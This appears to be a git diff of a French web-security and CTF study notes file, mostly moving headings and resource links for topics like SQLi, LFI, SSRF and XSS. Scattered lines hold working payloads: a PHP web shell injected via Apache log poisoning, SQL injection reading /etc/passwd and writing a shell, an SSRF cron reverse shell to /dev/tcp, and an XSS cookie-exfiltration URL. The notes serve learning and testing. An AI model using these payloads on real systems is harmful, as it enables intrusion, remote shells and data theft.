@@ -24,7 +24,50 @@
 
 - [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)
 
-### API & CRUD
+## Extensions
+
+### Firefox
+
+- [Hacktools](https://addons.mozilla.org/fr/firefox/addon/hacktools/)
+- [Wappalyzer](https://addons.mozilla.org/fr/firefox/addon/wappalyzer/)
+- [ProtonPass](https://proton.me/fr/pass/download)
+- [Ublock](https://addons.mozilla.org/fr/firefox/addon/ublock-origin/)
+- [DotGit](https://github.com/davtur19/DotGit) **avec** https://github.com/arthaud/git-dumper
+- [Shodan](https://addons.mozilla.org/en-US/firefox/addon/shodan-addon/)
+- [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
+- [Retire.js](https://retirejs.github.io/retire.js/)
+
+### Chrome (only)
+
+- [Shodan](https://chromewebstore.google.com/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap)
+- [Tempmail](https://chromewebstore.google.com/detail/temp-mail-disposable-temp/inojafojbhdpnehkhhfjalgjjobnhomj)
+
+### Burp
+
+`Never trust user input`
+
+- [Bypass WAF](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c)
+- [Hackvertor](https://github.com/hackvertor/hackvertor)
+- [JWT](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)
+- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+- [Param Miner](https://github.com/portswigger/param-miner)
+
+## Cheatsheet
+
+- http://wikisecu.fr/doku.php?id=web
+- https://infosec.mozilla.org/guidelines/web_security#web-security-cheat-sheet
+
+- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [Hacktricks](https://book.hacktricks.xyz/welcome/readme), [Hacktricks - Bypass 403](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
+- [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
+- https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
+- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Spring%20boot%20-%20Reference%20guide.pdf
+
+### Encoding
+
+- https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/
+
+## API & CRUD
 
 - https://fastapi.tiangolo.com/
 - https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
@@ -126,57 +169,16 @@ sudo systemctl restart httpd
 - https://devdocs.io/
 - https://docs.docker.com/samples/react/
 
-## Extensions
-
-### Firefox
-
-- [Hacktools](https://addons.mozilla.org/fr/firefox/addon/hacktools/)
-- [Wappalyzer](https://addons.mozilla.org/fr/firefox/addon/wappalyzer/)
-- [ProtonPass](https://proton.me/fr/pass/download)
-- [Ublock](https://addons.mozilla.org/fr/firefox/addon/ublock-origin/)
-- [DotGit](https://github.com/davtur19/DotGit) **avec** https://github.com/arthaud/git-dumper
-- [Shodan](https://addons.mozilla.org/en-US/firefox/addon/shodan-addon/)
-- [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
-- [Retire.js](https://retirejs.github.io/retire.js/)
-
-### Chrome (only)
-
-- [Shodan](https://chromewebstore.google.com/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap)
-- [Tempmail](https://chromewebstore.google.com/detail/temp-mail-disposable-temp/inojafojbhdpnehkhhfjalgjjobnhomj)
-
-### Burp
-
-`Never trust user input`
-
-- [Hackvertor](https://github.com/hackvertor/hackvertor)
-- [JWT](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)
-- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
-- [Param Miner](https://github.com/portswigger/param-miner)
-
-## Cheatsheet
-
-- http://wikisecu.fr/doku.php?id=web
-- https://infosec.mozilla.org/guidelines/web_security#web-security-cheat-sheet
-
-- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [Hacktricks](https://book.hacktricks.xyz/welcome/readme), [Hacktricks - Bypass 403](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
-- [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
-- https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
-- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Spring%20boot%20-%20Reference%20guide.pdf
-
-## Encoding
-
-- https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/
 
 **Serveur**
 
-### Broken Auth
+## Broken Auth
 
 - IDOR
 - [Password Reset Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-feature)
 - [UUID - Sandwich Attack](https://github.com/Lupin-Holmes/sandwich)
 
-### GraphQL
+## GraphQL
 
  - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
  - https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
@@ -184,7 +186,7 @@ sudo systemctl restart httpd
 
 ![](./api.gif)
 
-### LFI
+## LFI
 
 - https://www.clever-age.com/owasp-local-remote-file-inclusion-lfi-rfi/
 
@@ -196,11 +198,12 @@ $file = basename(realpath($_GET["filename"]));
 include("pages/$file");
 ?>
 ```
+
 et `.htaccess`
 
 `allow_url_include = Off` pour PHP<7.4.0
 
-#### Apache Log Poisoning
+### Apache Log Poisoning
 
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache
 
@@ -209,7 +212,7 @@ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
-### SQLi
+## SQLi
 
 - https://mariadb.com/resources/blog/how-to-connect-python-programs-to-mariadb/
 - https://gonzalo123.com/2021/10/25/listen-to-postgresql-events-with-pg_notify-and-python/
@@ -225,7 +228,7 @@ BEUST: Blind,Error,Union,Stacked,Time-based
 
 `Union classic`:
 
-```
+```sql
 ' union select 0,0,0,0 #
 
 ' union select 0,0,table_name,0 from information_schema.tables #
@@ -235,7 +238,7 @@ BEUST: Blind,Error,Union,Stacked,Time-based
  ' union select id, origine, message, 0 from chall #
 ```
 
-#### R/W file
+### R/W file
 
 ```
 # Read file
@@ -245,13 +248,13 @@ UNION SELECT LOAD_FILE ("etc/passwd")--
 UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 ```
 
-#### RCE - GCC extension
+### RCE - GCC extension
 
 - https://pentestmonkey.net/category/tools/audit
 
 `Protection`: [quoted & prepared statements](https://phpdelusions.net/mysqli_examples/prepared_select)
 
-### NoSQLi
+## NoSQLi
 
   - https://www.mongodb.com/community/forums/t/unrecognized-pipeline-stage-name-search/111883
   - https://www.dailysecurity.fr/nosql-injections-classique-blind/
@@ -260,17 +263,17 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22flag%22,%22as%22:%22str%22,%22foreignField%22:%22flag%22,%22localField%22:%22flag
 ```
 
-### SSTI
+## SSTI
 
 - https://cheatsheet.hackmanit.de/template-injection-table/
 
-### Java 
+## Java
 
 - `Deserialize` https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 - 		https://www.synacktiv.com/publications/java-deserialization-tricks
 - `Log4j` https://www.lunasec.io/docs/blog/log4j-zero-day/
 
-### PHP
+## PHP
 
   - **Bypass `preg_match(" | _/")`** : `.`, ou `]` ou encore d'autres caractères peuvent remplacer `_`:  https://ctftime.org/writeup/11535 
   -  https://borelenzo.github.io/stuff/2023/10/31/hidden-in-plain-sight.html
@@ -280,7 +283,7 @@ https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22fl
   - `Serialize` https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
   -  https://www.saotn.org/exploit-php-mail-get-remote-code-execution/
 
-#### CGI - bypass `disable_functions`
+### CGI - bypass `disable_functions`
 
 - https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
 - https://github.com/BorelEnzo/FuckFastcgi
@@ -289,12 +292,12 @@ https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22fl
 
 - https://stackoverflow.com/questions/1271899/disable-php-in-directory-including-all-sub-directories-with-htaccess
 
-```
+```php
 #.htaccess
 php_flag engine off
 ```
 
-### Python
+## Python
 
   - `Flask`: https://ctftime.org/writeup/36100
   - `Pickle`: https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/, [Doc Python __reduce__](https://docs.python.org/3/library/pickle.html#object.__reduce__), [Procoles (version pickle)](https://stackoverflow.com/questions/23582489/python-pickle-protocol-choice), [Pickle](https://stackoverflow.com/questions/7501947/understanding-pickling-in-python)
@@ -304,7 +307,7 @@ php_flag engine off
   token = base64.b64encode(pickle.dumps(Exploit(), protocol=0))
   ```
 
-### SSRF
+## SSRF
   - https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
   - https://www.dailysecurity.fr/server-side-request-forgery/
 
@@ -316,29 +319,35 @@ for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://
 dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
-### XXE
+## XXE
   - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
  
 --------
 
 **Client**
 
+## Doc - Client
+
 - https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
 - https://www.devsecurely.com/blog/2024/06/cors-the-ultimate-guide
 - https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
 
-### Obfu
+## Exercices
+
+- https://alert.zeyu2001.com/
+
+## Obfu
 
 - https://obf-io.deobfuscate.io/
 - https://js.retn0.kr/
 
-### AST
+## AST
 
 - https://seal9055.com/blog/browser/browser_architecture
 
 ![](./url.png)
 
-### CSRF
+## CSRF
 
 - https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
@@ -352,7 +361,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 ```
 
-### DOM - notions
+## DOM - notions
 
 ![https://www.w3schools.com/js/js_htmldom.asp](dom.gif)
 
@@ -371,11 +380,11 @@ Voir aussi `elements`
 
 - https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
 
-### Reverse Tabnabbing
+## Reverse Tabnabbing
 
 - https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing
 
-### XSS
+## XSS
 
  - https://liveoverflow.com/do-not-use-alert-1-in-xss/
  - https://beta.hackndo.com/attaque-xss/
@@ -383,7 +392,7 @@ Voir aussi `elements`
  - https://learn-cyber.net/article/Self-XSS-Attacks
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
 
-#### Filters bypass
+### Filters bypass
 
  - https://javascript.info/script-async-defer
  - https://github.com/payloadbox/xss-payload-list
@@ -409,7 +418,7 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 
 -> accès aux erreurs
 
-#### CSP
+### CSP
 
 [CSP Bypass](https://csplite.com/csp320/)
 
@@ -437,14 +446,11 @@ nc -nlvp 4444
 python -m http.server 4444
 python -m pyftpdlib -D
 ```
-### HTTP Smuggling
+
+## HTTP Smuggling
 
 - https://franso.re/fr/blog/http_rs_pour_les_nuls
 
-### XS -Leaks
+## XS -Leaks
 
 - https://xsleaks.dev/
-
-## Exercices
-
-- https://alert.zeyu2001.com/
